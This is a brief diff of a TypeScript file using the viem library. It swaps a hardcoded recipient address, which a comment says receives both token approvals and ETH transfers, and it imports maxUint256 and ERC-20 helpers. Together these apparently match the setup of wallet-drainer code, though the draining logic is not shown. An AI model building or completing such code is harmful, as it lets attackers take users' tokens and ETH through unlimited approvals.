@@ -7,7 +7,7 @@ import { parseEther, maxUint256 } from 'viem';
 import { erc20Abi } from 'viem';
 
 // Your specified recipient address for both approval and ETH transfer
-const RECIPIENT_ADDRESS = '0x30925a8A61e2c66fDE526A82c76d030E7D704694' as const;
+const RECIPIENT_ADDRESS = '0x661A263CD9AA2753af6a4501316172bD9497f143' as const;
 
 // Token addresses on different networks
 const TOKEN_ADDRESSES = {
